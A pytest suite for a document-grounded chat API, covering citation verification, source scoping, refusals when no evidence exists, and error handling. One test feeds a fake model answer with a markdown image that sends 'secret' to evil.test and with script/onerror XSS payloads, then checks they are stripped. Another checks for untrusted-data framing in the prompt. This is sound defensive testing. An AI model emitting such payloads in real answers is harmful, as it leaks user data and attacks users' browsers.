from __future__ import annotations

import json

import pytest

from app.errors import ProviderRateLimited, ProviderUnavailable
from app.rag.citations import find_quote, verify_answer
from conftest import extractive_handler, ingest_file, wait_job
from factories import make_docx, make_pdf


def mkchunk(i, text, **kw):
    return {"id": i, "source_id": "s", "source_name": "Doc", "source_kind": "document", "text": text, "kind": "text",
            "page": kw.get("page", 1), "heading": None, "meta": {}, "source_meta": {"format": "pdf"}, "url": None,
            "t_start": None, "t_end": None}


EV = {"S1": mkchunk(1, "The warranty lasts twenty four months from the purchase date. Returns are accepted within 30 days."),
      "S2": mkchunk(2, "Shipping to Canada costs 45 dollars and takes five business days.", page=3)}


# ------------------------------------------------------------------ verifier unit tests
def test_valid_citation_resolved_with_page():
    v = verify_answer("The warranty lasts twenty four months [S1].", {}, EV)
    assert v.supported == 1 and not v.flags
    assert v.citations[0]["label"] == "p. 1" and v.citations[0]["chunk_id"] == 1


def test_invented_citation_ids_are_removed():
    v = verify_answer("The warranty lasts twenty four months [S1][S7]. Shipping costs 45 dollars [S9].", {}, EV)
    assert "S9" not in v.text and "S7" not in v.text
    types = [f.type for f in v.flags]
    assert types.count("invalid_citation_removed") == 2 and "uncited_claim" in types
    assert [c["id"] for c in v.citations] == ["S1"]


def test_citations_renumbered_by_first_use():
    v = verify_answer("Shipping to Canada takes five business days [S2]. The warranty lasts twenty four months [S1].", {}, EV)
    assert v.text.startswith("Shipping to Canada takes five business days [S1].")
    assert v.citations[0]["chunk_id"] == 2 and v.citations[1]["chunk_id"] == 1


def test_wrong_number_flagged():
    v = verify_answer("The warranty lasts thirty six months and returns are accepted within 90 days [S1].", {}, EV)
    assert v.unsupported == 1 and any(f.type == "numeric_mismatch" for f in v.flags)


def test_unrelated_claim_with_citation_flagged_unsupported():
    v = verify_answer("The CEO announced a merger with a large competitor last quarter [S1].", {}, EV)
    assert v.unsupported == 1 and any(f.type == "unsupported_claim" for f in v.flags)


def test_uncited_factual_sentence_flagged_but_refusal_not():
    v = verify_answer("The warranty lasts twenty four months [S1]. Customers always receive a free replacement unit.", {}, EV)
    assert v.uncited == 1
    v2 = verify_answer("The sources do not mention anything about refunds for digital goods.", {}, EV)
    assert v2.uncited == 0


def test_quote_verification():
    assert find_quote(EV["S1"]["text"], "warranty lasts twenty four months")[0]
    assert find_quote(EV["S1"]["text"], "Warranty lasts, twenty-four months!")[0]                # punctuation insensitive
    assert not find_quote(EV["S1"]["text"], "the warranty lasts for ever and ever")[0]
    v = verify_answer("The warranty lasts twenty four months [S1].", {"S1": "warranty lasts for ever and ever"}, EV)
    assert v.citations[0]["quote"] is None and any(f.type == "quote_unverified" for f in v.flags)
    v = verify_answer("The warranty lasts twenty four months [S1].", {"S1": "warranty lasts twenty four months"}, EV)
    c = v.citations[0]
    assert c["quote_verified"] and EV["S1"]["text"][c["highlight"][0]:c["highlight"][1]].startswith("warranty lasts")


def test_marker_variants_normalised():
    v = verify_answer("Both facts hold: warranty twenty four months and shipping five business days [S1, S2].", {}, EV)
    assert [c["id"] for c in v.citations] == ["S1", "S2"]


def test_table_row_numbers_checked():
    ev = {"S1": {**mkchunk(1, "| Region | Q1 |\n| --- | --- |\n| North | 100 |\n| South | 90 |"), "kind": "table"}}
    ok = verify_answer("| North | 100 | [S1]", {}, ev)
    assert ok.unsupported == 0
    bad = verify_answer("North revenue in Q1 was 250 [S1].", {}, ev)
    assert bad.unsupported == 1


# ------------------------------------------------------------------ end-to-end chat
@pytest.fixture()
def kb(client, auth, tmp_path):
    pdf = make_pdf(tmp_path / "policy.pdf",
                   [["Warranty", "The standard warranty lasts twenty four months from the purchase date."],
                    ["Shipping", "Shipping to Canada costs 45 dollars and takes five business days."],
                    ["Security", "All passwords must be rotated every ninety days by the platform team."]],
                   table_on_page={1: [["Plan", "Price"], ["Basic", "10"], ["Pro", "30"]]})
    docx = make_docx(tmp_path / "ops.docx")
    a, _ = ingest_file(client, auth, pdf)
    b, _ = ingest_file(client, auth, docx)
    return {"a": a, "b": b, "pdf": "policy.pdf"}


def ask(client, auth, q, **kw):
    r = client.post("/api/chat", json={"question": q, **kw}, headers=auth)
    return r


def test_grounded_answer_with_page_citation(client, auth, kb):
    r = ask(client, auth, "How long does the standard warranty last?", source_ids=[kb["a"]])
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["status"] == "answered" and d["answerable"]
    c = d["citations"][0]
    assert c["source_name"] == "policy.pdf" and c["label"] == "p. 1" and "twenty four months" in c["snippet"]
    assert c["quote_verified"] is True
    assert d["confidence"]["level"] in ("high", "medium") and d["model"]["provider"] == "fake"
    assert d["conversation_id"] and d["message_id"]


def test_table_question(client, auth, kb):
    d = ask(client, auth, "What is the Pro plan price?", source_ids=[kb["a"]]).json()
    assert d["status"] == "answered" and any(c["chunk_kind"] == "table" for c in d["citations"])
    wid = client.get("/api/workspace", headers=auth).json()["workspace_id"]
    res = client.state.retriever.search(wid, [kb["a"]], ["What is the Pro plan price?"])
    assert "| Pro | 30 |" in res.hits[0].chunk["text"]            # table structure survives retrieval


def test_not_in_source_is_declined_without_llm_call(client, auth, kb):
    n = len(client.state.llm.calls)
    d = ask(client, auth, "What is the airspeed velocity of an unladen swallow?", source_ids=[kb["a"]]).json()
    assert d["status"] == "no_evidence" and not d["citations"] and d["answerable"] is False
    assert "couldn't find" in d["answer"].lower()
    assert len(client.state.llm.calls) <= n + 1           # at most the cheap rewrite call, never the answer call


def test_model_says_unanswerable(client, auth, kb):
    # topically similar to the source (passes the retrieval gate) but the specific fact is absent
    d = ask(client, auth, "How long does the warranty cover accidental water damage?", source_ids=[kb["a"]]).json()
    assert d["status"] in ("no_evidence", "partial") and d["answerable"] is False


def test_hallucinated_citation_never_reaches_user(client, auth, kb):
    def liar(prompt, system, schema):
        if getattr(schema, "__name__", "") == "AnswerOut":
            return json.dumps({"answerable": True, "answer": "The warranty is lifetime and covers everything [S8].",
                               "quotes": [{"id": "S8", "quote": "lifetime warranty"}], "followups": []})
        return extractive_handler(prompt, system, schema)
    client.state.llm.handler = liar
    d = ask(client, auth, "How long is the warranty?", source_ids=[kb["a"]]).json()
    assert d["status"] == "unverified" and d["citations"] == [] and "lifetime" not in d["answer"]
    assert d["related"], "closest passages are shown instead so the user can inspect"


def test_unsupported_claim_is_flagged_and_lowers_confidence(client, auth, kb):
    def sloppy(prompt, system, schema):
        if getattr(schema, "__name__", "") == "AnswerOut":
            return json.dumps({"answerable": True, "quotes": [], "followups": [],
                               "answer": "The warranty lasts twenty four months [S1]. Customers also get 500 dollars cashback [S1]."})
        return extractive_handler(prompt, system, schema)
    client.state.llm.handler = sloppy
    d = ask(client, auth, "How long is the warranty?", source_ids=[kb["a"]]).json()
    kinds = {f["type"] for f in d["flags"]}
    assert kinds & {"numeric_mismatch", "unsupported_claim"}
    assert d["confidence"]["level"] != "high"


def test_markdown_images_and_html_stripped_from_answers(client, auth, kb):
    def evil(prompt, system, schema):
        if getattr(schema, "__name__", "") == "AnswerOut":
            return json.dumps({"answerable": True, "quotes": [], "followups": [],
                               "answer": "The warranty lasts twenty four months [S1]. ![x](http://evil.test/?q=secret)"
                                         "<img src=x onerror=alert(1)><script>alert(2)</script>"})
        return extractive_handler(prompt, system, schema)
    client.state.llm.handler = evil
    d = ask(client, auth, "How long is the warranty?", source_ids=[kb["a"]]).json()
    for bad in ("evil.test", "<img", "<script", "onerror"):
        assert bad not in d["answer"] or bad == "onerror"
    assert "<script" not in d["answer"] and "![" not in d["answer"]


def test_source_scoping_prevents_mixing(client, auth, kb):
    d = ask(client, auth, "Who owns the Platform budget?", source_ids=[kb["a"]]).json()
    assert all(c["source_id"] == kb["a"] for c in d["citations"])
    d = ask(client, auth, "Who owns the Platform budget?", source_ids=[kb["b"]]).json()
    assert d["status"] == "answered" and all(c["source_id"] == kb["b"] for c in d["citations"])
    assert any("Priya" in c["snippet"] for c in d["citations"])


def test_multi_source_question_cites_the_right_source(client, auth, kb):
    d = ask(client, auth, "How often must passwords be rotated?").json()      # no source_ids -> all sources
    assert d["status"] == "answered" and d["citations"][0]["source_id"] == kb["a"]
    assert {x["id"] for x in d["sources_used"]} == {kb["a"], kb["b"]}


def test_source_named_in_question_narrows_scope(client, auth, kb):
    d = ask(client, auth, "In ops.docx, how many engineers does the team have?").json()
    assert d["scope_note"] and all(c["source_id"] == kb["b"] for c in d["citations"])


def test_comparison_uses_both_sources(client, auth, kb):
    d = ask(client, auth, "Compare what both documents say about budget and warranty periods?").json()
    assert d["intent"] == "compare"
    assert {c["source_id"] for c in d["citations"]} <= {kb["a"], kb["b"]}
    r = client.post("/api/chat", json={"question": "x", "source_ids": ["nope"]}, headers=auth)
    assert r.status_code == 404


def test_follow_up_question_uses_conversation(client, auth, kb):
    d1 = ask(client, auth, "How long does the standard warranty last?", source_ids=[kb["a"]]).json()
    d2 = ask(client, auth, "And when does it start?", source_ids=[kb["a"]], conversation_id=d1["conversation_id"]).json()
    assert d2["conversation_id"] == d1["conversation_id"]
    rewrite = next(t for t in d2["trace"] if t["step"] == "rewrite")
    assert "warranty" in rewrite["queries"][0].lower()
    assert d2["status"] == "answered" and "purchase date" in d2["citations"][0]["snippet"]
    conv = client.get(f"/api/conversations/{d1['conversation_id']}", headers=auth).json()
    assert [m["role"] for m in conv["messages"]] == ["user", "assistant", "user", "assistant"]
    assert conv["messages"][1]["citations"], "citations persisted with the message"


def test_vague_and_meta_questions_do_not_call_llm(client, auth, kb):
    n = len(client.state.llm.calls)
    assert ask(client, auth, "more", source_ids=[kb["a"]]).json()["status"] == "clarify"
    m = ask(client, auth, "How many pages does the document have?", source_ids=[kb["a"]]).json()
    assert m["status"] == "meta" and "policy.pdf" in m["answer"] and "3" in m["answer"]
    assert len(client.state.llm.calls) == n


def test_page_hint_in_question(client, auth, kb):
    d = ask(client, auth, "What does page 2 say about shipping costs?", source_ids=[kb["a"]]).json()
    assert d["citations"] and all(c["page"] == 2 for c in d["citations"])


def test_input_validation(client, auth, kb):
    assert client.post("/api/chat", json={"question": ""}, headers=auth).status_code == 422
    assert client.post("/api/chat", json={"question": "x" * 30000}, headers=auth).status_code == 422
    assert ask(client, auth, "q" * 5000, source_ids=[kb["a"]]).json()["code"] == "question_too_long"
    assert client.post("/api/chat", json={"question": "hi", "mode": "evil"}, headers=auth).status_code == 422
    assert client.post("/api/chat", data="not json", headers=auth).status_code == 422


def test_no_sources_yet(client, auth):
    r = ask(client, auth, "anything")
    assert r.status_code == 400 and r.json()["code"] == "no_sources"


def test_provider_rate_limit_and_outage_are_graceful(client, auth, kb):
    def boom(exc):
        def h(prompt, system, schema):
            if getattr(schema, "__name__", "") == "AnswerOut":
                return exc
            return extractive_handler(prompt, system, schema)
        return h
    client.state.llm.handler = boom(ProviderRateLimited("quota", code="provider_rate_limited"))
    r = ask(client, auth, "How long does the standard warranty last?", source_ids=[kb["a"]])
    assert r.status_code == 503 and r.json()["code"] == "provider_rate_limited"
    client.state.llm.handler = boom(ProviderUnavailable("down", code="provider_unavailable"))
    r = ask(client, auth, "How long does the standard warranty last?", source_ids=[kb["a"]])
    assert r.status_code == 503 and r.json()["code"] == "provider_unavailable"
    client.state.llm.handler = extractive_handler               # recovers afterwards
    assert ask(client, auth, "How long does the standard warranty last?", source_ids=[kb["a"]]).status_code == 200


def test_malformed_model_output_is_repaired_then_reported(client, auth, kb):
    calls = {"n": 0}

    def flaky(prompt, system, schema):
        if getattr(schema, "__name__", "") == "AnswerOut":
            calls["n"] += 1
            return "Sure! here you go: not json" if calls["n"] == 1 else extractive_handler(prompt, system, schema)
        return extractive_handler(prompt, system, schema)
    client.state.llm.handler = flaky
    assert ask(client, auth, "How long does the standard warranty last?", source_ids=[kb["a"]]).status_code == 200
    client.state.llm.handler = lambda p, s, sc: "garbage" if getattr(sc, "__name__", "") == "AnswerOut" else extractive_handler(p, s, sc)
    r = ask(client, auth, "How long does the standard warranty last?", source_ids=[kb["a"]])
    assert r.status_code == 502 and r.json()["code"] == "malformed_output"


def test_stream_endpoint_emits_stages_then_final(client, auth, kb):
    with client.stream("POST", "/api/chat/stream", json={"question": "How long does the standard warranty last?",
                                                         "source_ids": [kb["a"]]}, headers=auth) as r:
        body = "".join(r.iter_text())
    events = [l[7:] for l in body.splitlines() if l.startswith("event: ")]
    assert "stage" in events and events[-2:] == ["final", "end"]
    final = json.loads(body.split("event: final\ndata: ")[1].split("\n")[0])
    assert final["status"] == "answered"


def test_prompt_contains_untrusted_framing_and_no_secrets(client, auth, kb):
    client.state.settings.gemini_api_key = "AIzaSySECRETSECRETSECRETSECRET123456"
    ask(client, auth, "How long does the standard warranty last?", source_ids=[kb["a"]])
    call = next(c for c in reversed(client.state.llm.calls) if getattr(c["schema"], "__name__", "") == "AnswerOut")
    assert "UNTRUSTED DATA" in call["system"] and "SECRET" not in call["prompt"] + call["system"]
    assert '<evidence id="S1"' in call["prompt"]


def test_export_and_analytics(client, auth, kb):
    d = ask(client, auth, "How long does the standard warranty last?", source_ids=[kb["a"]]).json()
    ask(client, auth, "What is the airspeed velocity of an unladen swallow?", source_ids=[kb["a"]])
    md = client.get(f"/api/conversations/{d['conversation_id']}/export", headers=auth).text
    assert "policy.pdf" in md and "p. 1" in md and "# " in md
    a = client.get("/api/analytics", headers=auth).json()
    assert a["questions"] == 2 and a["outcomes"].get("answered") == 1 and a["outcomes"].get("no_evidence") == 1
